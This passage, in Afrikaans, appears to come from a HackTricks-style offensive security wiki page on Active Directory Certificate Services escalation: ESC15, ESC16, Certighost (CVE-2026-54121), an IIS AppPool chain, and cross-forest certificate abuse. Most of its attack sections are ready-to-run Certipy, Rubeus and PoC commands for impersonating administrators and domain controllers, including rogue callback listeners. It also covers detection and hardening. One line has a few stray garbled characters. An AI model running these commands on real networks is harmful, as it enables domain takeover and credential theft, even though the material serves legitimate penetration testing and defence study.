Die [oorspronklike ESC15-navorsing](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc) verduidelik hoe application policies wat in 'n versoek vir 'n V1-template verskaf word, die ingestelde Extended Key Usage op 'n **ongepatchte uitreikende CA** kan oorheers.<sup>[[15]](#references)</sup> 'n Kandidaat benodig ook 'n gepubliseerde template waarvoor inskrywing toegelaat word, wat die vereiste subject-/versoekeienskappe toelaat en geen blokkerende goedkeurings- of handtekeningvereiste het nie. Inskrywingsregte alleen bewys nie dat uitbuiting moontlik is nie. Die gebruik van Certificate Request Agent kan ook afhang van 'n geskikte tweede template en beperkings vir inskrywingsagente; bevestig die CA se patchstatus en die uitreikingsresultaat voordat jy beweer dat dié metode werk.

### Misbruik

Die [Certipy-dokumentasie oor privilege-escalation](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu) bevat meer gedetailleerde gebruiksvoorbeelde.<sup>[[14]](#references)</sup>


Certipy se `find`-opdrag kan help om V1-templates te identifiseer wat moontlik kwesbaar is vir ESC15 as die CA ongepatch is.

```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```

#### Scenario A: Direkte nabootsing via Schannel

**Stap 1: Versoek ’n sertifikaat en spuit die "Client Authentication"-toepassingsbeleid en teiken-UPN in.** Aanvaller `attacker@corp.local` teiken `administrator@corp.local` met die "WebServer" V1-sjabloon (wat ’n onderwerp toelaat wat deur die inskrywer verskaf word).

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'WebServer' \
    -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
    -application-policies 'Client Authentication'
```

- `-template 'WebServer'`: Die kwesbare V1-sjabloon met "Enrollee supplies subject".
- `-application-policies 'Client Authentication'`: Voeg die OID `1.3.6.1.5.5.7.3.2` by die Application Policies-uitbreiding van die CSR.
- `-upn 'administrator@corp.local'`: Stel die UPN in die SAN vir nabootsing.

**Stap 2: Verifieer via Schannel (LDAPS) met die verkreë sertifikaat.**

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```

#### Scenario B: PKINIT/Kerberos Impersonation via Enrollment Agent Abuse

**Stap 1: Versoek ’n sertifikaat vanaf ’n V1-sjabloon (met "Enrollee supplies subject"), en voeg die "Certificate Request Agent"-toepassingsbeleid in.** Hierdie sertifikaat is vir die aanvaller (`attacker@corp.local`) om ’n enrollment agent te word. Geen UPN word vir die aanvaller se eie identiteit hier gespesifiseer nie, aangesien die doel die agent-vermoë is.

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'WebServer' \
    -application-policies 'Certificate Request Agent'
```

- `-application-policies 'Certificate Request Agent'`: Voeg OID `1.3.6.1.4.1.311.20.2.1` in.

**Stap 2: Gebruik die "agent"-sertifikaat om namens ’n teiken-gebruiker met bevoorregte toegang ’n sertifikaat aan te vra.** Dit is ’n ESC3-agtige stap wat die sertifikaat van Stap 1 as die agent-sertifikaat gebruik.

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'User' \
    -pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```

**Stap 3: Outentiseer as die bevoorregte gebruiker met die "on-behalf-of"-sertifikaat.**

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```

## Sekuriteitsuitbreiding op CA gedeaktiveer (globaal)-ESC16

### Verduideliking

**ESC16 (Privilege-escalasie weens ontbrekende szOID_NTDS_CA_SECURITY_EXT-uitbreiding)** beskryf CA-wye onderdrukking van die **szOID_NTDS_CA_SECURITY_EXT** SID-uitbreiding. Dit is ’n konfigurasie-aanwyser, nie bewys dat ’n sertifikaat as ’n ander rekening kan verifieer nie. Nabootsing vereis ook beheer oor die betrokke rekeningkenmerke of kartering, ’n inskryfbare kliëntverifikasiesjabloon en ’n sertifikaatkarteringsroete wat deur die werklike domeinbeheerder of diens aanvaar word. ’n Gelapte KDC in Full Enforcement verwerp sertifikate sonder ’n SID-uitbreiding, tensy hulle ’n ander sterk kartering het; die UPN-only Kerberos-prosedure hieronder is van toepassing op ouer KDC’s of KDC’s in versoenbaarheidsmodus wat steeds swak kartering aanvaar. Sien [Microsoft se leiding oor sertifikaatkartering en afdwinging](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers).

Jy kan ook na hierdie artikel verwys om meer oor die gedetailleerde beginsel te leer:https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6<sup>[[16]](#references)</sup>

### Misbruik

Die volgende historiese UPN-only Kerberos-voorbeeld is gebaseer op [Certipy se ESC16-dokumentasie](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally). Dit vereis ’n KDC wat steeds die gevolglike swak kartering aanvaar; `StrongCertificateBindingEnforcement=1` is nie meer ’n ondersteunde oorheersing ná die Windows-sekuriteitsopdatering van 9 September 2025 nie.<sup>[[14]](#references)</sup>

Om te bepaal of die Active Directory Certificate Services (AD CS)-omgewing kwesbaar is vir **ESC16**】【。

```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```

**Stap 1: Lees die aanvanklike UPN van die slagofferrekening (Opsioneel - vir herstel).  


```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -user 'victim' \
    read
```

**Stap 2: Werk die slagofferrekening se UPN by na die teikenadministrateur se `sAMAccountName`.  

```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -upn 'administrator' \
    -user 'victim' update
```

**Stap 3: (Indien nodig) Verkry geloofsbriewe vir die "slagoffer"-rekening (bv. via Shadow Credentials).**

```shell
certipy shadow \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -account 'victim' \
    auto
```

**Stap 4: Vra ’n sertifikaat aan as die "slagoffer"-gebruiker vanaf ’n kliëntverifikasie-sjabloon waarvoor die rekening kan inskryf (bv. "User") op die ESC16-gekonfigureerde CA.** Die CA laat die SID-sekuriteitsuitbreiding weg uit die uitgereikte sertifikaat, maar dit alleen skep nie ’n bruikbare verifikasiemapping nie. Stel die Kerberos-eiebewyskas-omgewingsveranderlike (shell-opdrag):

```bash
export KRB5CCNAME=victim.ccache
```

Versoek dan die sertifikaat:

```bash
certipy req \
    -k -dc-ip '10.0.0.100' \
    -target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
    -template 'User'
```

**Stap 5: Herstel die "slagoffer"-rekening se UPN.**

```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -upn 'victim@corp.local' \
    -user 'victim' update
```

**Stap 6: Gebruik 'n ouer of compatibility-mode KDC wat hierdie swak kartering aanvaar om as die teikenadministrateur te authenticate.**

```bash
certipy auth \
    -dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
    -username 'administrator' -domain 'corp.local'
```

## Rogue LDAP/LSA chase callback identity substitution (Certighost / CVE-2026-54121)

### Verduideliking

**Certighost** misbruik ’n **AD CS enrollment chase / callback-pad** waar die CA aanvraer-verskafde versoekkenmerke vertrou om te bepaal watter identiteit in die uitgereikte sertifikaat geplaas moet word. In die openbare PoC bevat die vervalste versoek:<sup>[[1]](#references)[[2]](#references)</sup>

- **`cdc`**: aanvaller-beheerde gasheer/IP waarmee die CA kontak sal maak
- **`rmd`**: die **teiken se Domain Controller DNS-naam** om na te boots

As die CA daardie chase volg, sal dit oor **SMB/LSA (`445`)** en **LDAP (`389`)** aan die aanvaller koppel. Die aanvaller gebruik ’n **werklike masjienrekening** (gewoonlik geskep via die verstekwaarde van **`ms-DS-MachineAccountQuota`**), sodat die callback-sessie as ’n geldige domeinprincipal staaf, maar die kwaadwillige dienste gee eerder die **teiken-DC** se identiteitskenmerke terug:

- `sAMAccountName`
- `objectSid` / SID
- `dNSHostName`

As die CA **nie die teruggestuurde identiteit kriptografies aan die geverifieerde callback-principal koppel nie**, kan dit ’n sertifikaat vir die **Domain Controller** uitreik, al het die sessie as die aanvaller-beheerde masjienrekening staaf. Dit maak die fout konseptueel anders as **Certifried**: in plaas daarvan om AD-kenmerke soos `dNSHostName` te herskryf, **vervang die aanvaller identiteitsdata tydens CA-callback-resolusie**.<sup>[[2]](#references)</sup>

**Nuttige voorvereistes:**

- Laevoorregte **domeinbewyse**
- Vermoë om ’n rekenaarrekening **te skep of te hergebruik**
- Netwerkbereikbaarheid vanaf die **CA** na aanvaller-beheerde **poorte `389` en `445`**
- Kwesbare / ongeïnstalleerde CA-versoekpad (die Microsoft-opdatering van **14 Julie 2026** het **DC-validering vir `cdc`** plus ’n **opgeloste-SID-vergelyking** bygevoeg)

Die resulterende **`.pfx`** kan dan vir **PKINIT** gebruik word, wat ’n **`.ccache`** en, in die gepubliseerde PoC-vloei, die **teiken-DC se NT-hash** oplewer. Dit is normaalweg genoeg vir **volle domeinkompromittering**.

### Misbruik

Die openbare PoC outomatiseer die volledige ketting:<sup>[[1]](#references)</sup>

1. Skep of hergebruik ’n aanvaller-beheerde **masjienrekening**.
2. Begin **kwaadwillige LDAP- en SMB/LSA-luisteraars** op `389` en `445`.
3. Dien ’n sertifikaatversoek in wat aanvaller-beheerde **`cdc`**- en teiken-**`rmd`**-kenmerke bevat.
4. Laat die CA as die beheerde masjienrekening by die kwaadwillige luisteraars staaf, maar beantwoord die identiteitsnavrae met die **teiken-DC** se kenmerke.
5. Ontvang ’n CA-ondertekende **DC-sertifikaat**, en gebruik dit dan vir **PKINIT**.

```bash
sudo python3 certighost.py -d playground.local -u lowpriv -p 'Password1234' --dc-ip 192.168.1.10
```

Nuttige runtime-vlae van die PoC:

- `--listener <ip>`: kies uitdruklik die callback-IP wat in `cdc` geadverteer word
- `--computer-name <NAME$>`: hergebruik ’n bestaande masjienrekening in plaas daarvan om ’n nuwe een te skep

**Operasionele notas:**

- Die PoC benodig **root** omdat dit aan **bevoorregte poorte** `389` en `445` bind.
- Suksesvolle uitbuiting skryf plaaslik ’n **DC `.pfx`** en **Kerberos `.ccache`** weg.
- Omdat die sertifikaat aan ’n **Domain Controller-rekening** gekoppel word, kan opvolgaksies **sertifikaatgebaseerde Kerberos-auth**, **DCSync** en hergebruik van die herwonne **masjien-NT-hash** insluit.<sup>[[2]](#references)</sup>

## IIS AppPool-masjienregistrasie na Administrator op dieselfde gasheer

’n IIS-poel wat as `ApplicationPoolIdentity` loop, gebruik sy gasheer se **rekenaarrekening** vir uitgaande toegang tot netwerkhulpbronne. Daarom bly kode-uitvoering as `IIS AppPool\<POOL>` laevoorreg in die plaaslike token, maar kan dit ’n AD CS-versoek indien wat die CA as `HOST$` verifieer; dit is ’n uitgaande identiteitsverandering, nie token-nabootsing of ’n plaaslike verhoging van die Potato-styl nie.<sup>[[19]](#references)[[20]](#references)</sup>

Hierdie ketting vereis ’n domeingekoppelde IIS-gasheer, ’n Enterprise CA wat via RPC bereikbaar is, ’n gepubliseerde masjienverifikasie-sjabloon waarvoor die rekenaar registrasieregte het, PKINIT-ondersteuning en bereikbaarheid van die KDC/SMB. ’n Pasgemaakte poelidentiteit verander die uitgaande prinsipaal, dus moet jy bevestig dat die poel werklik `ApplicationPoolIdentity` gebruik voordat jy aanvaar dat dit `HOST$` is.<sup>[[19]](#references)[[20]](#references)</sup>

### Registrasie met ’n aanvaller-beheerde sleutel

Genereer die sleutelpaar en CSR weg van die IIS-bediener en behou die private sleutel. Dien **slegs die CSR** vanaf die gekompromitteerde werker in. Die [Certi-Bhai ASPX PoC](https://github.com/incredibleindishell/Certi-Bhai/blob/main/IIS_Privilege_escalation/cert.aspx) skep ’n `CertificateAuthority.Request`-instansie, stel `CertificateTemplate:Machine` in, roep `ICertRequest::Submit` aan en stuur die uitgereikte sertifikaat terug. Gebruik die CA-konfigurasi string `CAHOST\CA-NAME`; ’n normale `Machine`-sjabloon bou die onderwerp vanaf AD, dus is onderwerp-/SAN-data wat deur die aanvraer verskaf word nie nodig nie.<sup>[[18]](#references)[[19]](#references)[[21]](#references)</sup>

Kombineer die teruggestuurde sertifikaat met die **ooreenstemmende behoue sleutel**. `certutil -MergePFX machine_cert.cer machine_cert.pfx` werk slegs wanneer Windows reeds die sertifikaat met ’n toeganklike private sleutel kan assosieer; vir afsonderlike PEM-lêers, skep PKCS#12 uitdruklik:<sup>[[19]](#references)[[23]](#references)</sup>

```bash
openssl pkcs12 -export -in machine_cert.cer -inkey machine_cert.key \
  -out machine_cert.pfx -name 'HOST$'
```

Gebruik die PFX vir PKINIT en hou die teruggekryde rekenaar-TGT as base64 eerder as om dit onmiddellik in te spuit:<sup>[[5]](#references)[[19]](#references)</sup>

```powershell
Rubeus.exe asktgt /user:HOST$ /domain:DOMAIN /certificate:machine_cert.pfx `
  /password:PFX_PASSWORD /nowrap
```

### S4U2Self plus diensvervanging op dieselfde gasheer

S4U2Self laat 'n diens toe om 'n kaartjie **aan homself** te verkry wat 'n ander gebruiker se magtigingsdata bevat. Met die computer TGT kan Rubeus daardie kaartjie vir 'n bevoorregte gebruiker aanvra, die diensnaam in die teruggekeerde KRB-CRED na CIFS herskryf en dit inject. Dit is die plaaslike “delegate to thyself”-primitief: dit vereis nie S4U2Proxy of 'n `msDS-AllowedToDelegateTo`-inskrywing nie.<sup>[[5]](#references)[[17]](#references)[[22]](#references)</sup>

```powershell
Rubeus.exe s4u /self /impersonateuser:Administrator `
  /altservice:cifs/HOST.DOMAIN /ticket:BASE64_MACHINE_TGT /ptt /nowrap

klist
dir \\HOST.DOMAIN\C$
```

Die vervangde ticket is slegs bruikbaar deur dienste op **dieselfde rekenaarrekening/sleutel** (hier, CIFS op `HOST`). Dit is nie ’n herbruikbare Administrator-ticket vir ander domeinmasjiene nie. Die gedemonstreerde resultaat is ook bevoorregte SMB-/lêerstelseltoegang as Administrator; om ’n plaaslike `NT AUTHORITY\SYSTEM`-proses te verkry, vereis steeds ’n afsonderlike stap vir afstanduitvoering.<sup>[[5]](#references)[[17]](#references)[[19]](#references)</sup>

### Opsporing en verharding

- Korrelleer op die CA Certification Services-gebeurtenisse **4886** (versoek ontvang) en **4887** (uitgereik) vir onverwagte versoeke met die `Machine`-template deur IIS-bedienerrekeninge.<sup>[[19]](#references)[[24]](#references)</sup>
- Op DCs bevat gebeurtenis **4768** sertifikaatvelde wanneer sertifikaatvoorverifikasie gebruik word; stel waarskuwings op vir ongewone PKINIT-TGT-versoeke vir webbedienerrekeninge. Volg dit op met **4769**-versoeke wat ’n bevoorregte nagebootste identiteit en dieselfde gasheer betrek. Omdat Rubeus `/altservice` die diensnaam in die KRB-CRED aan die kliëntkant herskryf, moet die DC-kant se 4769-diensnaam nie noodwendig `cifs` wees nie.<sup>[[5]](#references)[[25]](#references)[[26]](#references)</sup>
- Soek na `w3wp.exe` wat CA RPC-eindpunte bereik, onverwagte ASPX-skepping, Kerberos-gewaarmerkte toegang tot administratiewe shares, en aktiwiteit wat geheime dump. Beperk waar moontlik toegang vanaf die app-tier tot CA RPC/KDC/SMB en verwyder rekenaarinskrywingsregte of masjienverifikasie-templates wat nie operasioneel nodig is nie.<sup>[[19]](#references)</sup>

## Kompromittering van woude met sertifikate, in die lydende vorm verduidelik

### Vertrouensverhoudings tussen woude word deur gekompromitteerde CAs verbreek

Die konfigurasie vir **kruis-woud-inskrywing** word betreklik eenvoudig gemaak. Die **wortel-CA-sertifikaat** van die hulpbronwoud word deur administrateurs **in die rekeningwoude gepubliseer**, en die **enterprise CA**-sertifikate van die hulpbronwoud word **by die `NTAuthCertificates`- en AIA-houers in elke rekeningwoud gevoeg**. Ter verduideliking: hierdie opstelling verleen aan die **CA in die hulpbronwoud volledige beheer** oor alle ander woude waarvoor dit PKI bestuur. Indien hierdie CA **deur aanvallers gekompromitteer word**, kan sertifikate vir alle gebruikers in beide die hulpbron- en rekeningwoude **deur hulle vervals word**, wat sodoende die sekuriteitsgrens van die woud verbreek.<sup>[[6]](#references)</sup>

### Inskrywingsregte word aan eksterne principals toegeken

In omgewings met verskeie woude moet versigtig omgegaan word met Enterprise CAs wat **sertifikaattemplates publiseer** wat **Authenticated Users of eksterne principals** (gebruikers/groepe buite die woud waaraan die Enterprise CA behoort) **inskrywings- en wysigingsregte** toelaat.\
Wanneer verifikasie oor ’n vertrouensverhouding plaasvind, word die **Authenticated Users SID** deur AD by die gebruiker se token gevoeg. Dus, as ’n domein ’n Enterprise CA het met ’n template wat **inskrywingsregte aan Authenticated Users toestaan**, kan ’n gebruiker van ’n ander woud moontlik **vir ’n template inskryf**. Net so word ’n **toegangsbeheer-verhouding oor woude heen geskep** wanneer **inskrywingsregte uitdruklik deur ’n template aan ’n eksterne principal toegeken word**, waardeur ’n principal van een woud **vir ’n template van ’n ander woud kan inskryf**.

Albei scenario’s lei tot ’n **vergroting van die aanvaloppervlak** van een woud na ’n ander. Die instellings van die sertifikaattemplate kan deur ’n aanvaller uitgebuit word om bykomende voorregte in ’n eksterne domein te verkry.<sup>[[6]](#references)</sup>


## References

- [1] [aniqfakhrul/CVE-2026-54121 PoC-bewaarplek](https://github.com/aniqfakhrul/CVE-2026-54121)
- [2] [H0j3n - Tegniese ontleding van Certighost](https://gist.github.com/H0j3n/a5ef2609b5f2944ac2390a191a534c26)
- [3] [Certify 2.0 – SpecterOps-blog](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [4] [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [5] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [6] [SpecterOps – Certified Pre-Owned: Misbruik van Active Directory Certificate Services](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [7] [Oliver Lyak – Certipy 4.0: ESC9, ESC10, BloodHound GUI, nuwe verifikasiemetodes en versoekmetodes, en meer](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [8] [SpecterOps – Shadow Credentials: Misbruik van Key Trust-rekeningkartering vir rekeningoorname](https://specterops.io/blog/2021/06/17/shadow-credentials-abusing-key-trust-account-mapping-for-account-takeover/)
- [9] [CQure Academy – Die verhaal van Enhanced Key (mis)Usage](https://cqureacademy.com/blog/enhanced-key-usage)
- [10] [Compass Security – Relaying na AD Certificate Services oor RPC](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)
- [11] [hajo – ESC12: Shell-toegang tot ADCS CA met YubiHSM](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm)
- [12] [SpecterOps – ADCS ESC13-misbruiktegniek](https://specterops.io/blog/2024/02/14/adcs-esc13-abuse-technique/)
- [13] [SpecterOps – ADCS ESC14-misbruiktegniek](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [14] [Certipy Wiki – Voorregte-eskalasie (ESC1-ESC17)](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
- [15] [TrustedSec – EKUwu: Nie net nog ’n AD CS ESC nie](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
- [16] [Furious5 – AD CS ESC16: Wankonfigurasie en uitbuiting](https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6)
- [17] [Charlie Clark – Herbesoek aan “Delegate 2 Thyself”](https://exploit.ph/revisiting-delegate-2-thyself.html)
- [18] [incredibleindishell/Certi-Bhai – IIS AD CS-inskrywing-PoC](https://github.com/incredibleindishell/Certi-Bhai/blob/main/IIS_Privilege_escalation/cert.aspx)
- [19] [Mannu Linux – Voorregte-eskalasie vanaf IIS AppPool via die AD CS RPC-eindpunt](https://mannulinux.org/2026/08/Privilege-escalation-from-IIS-AppPool-to-NT-AuthoritySYSTEM-via-AD-CS-RPC-endpoint.html)
- [20] [Microsoft – Toepassingspoel-identiteite](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities)
- [21] [Microsoft – ICertRequest::Submit](https://learn.microsoft.com/en-us/windows/win32/api/certcli/nf-certcli-icertrequest-submit)
- [22] [Microsoft Open Specifications – S4U2self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/02636893-7a1f-4357-af9a-b672e3e3de13)
- [23] [OpenSSL – pkcs12-opdrag](https://docs.openssl.org/3.6/man1/openssl-pkcs12/)
- [24] [Microsoft – Oudit van Certification Services](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/audit-certification-services)
- [25] [Microsoft – Gebeurtenis 4768: ’n Kerberos-verifikasieticket is aangevra](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768)
- [26] [Microsoft – Gebeurtenis 4769: ’n Kerberos-diensticket is aangevra](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4769)
- [27] [incredibleindishell/Certi-Bhai – AD CS PowerShell-uitbuitingstel](https://github.com/incredibleindishell/Certi-Bhai)
{{#include ../../../banners/hacktricks-training.md}}
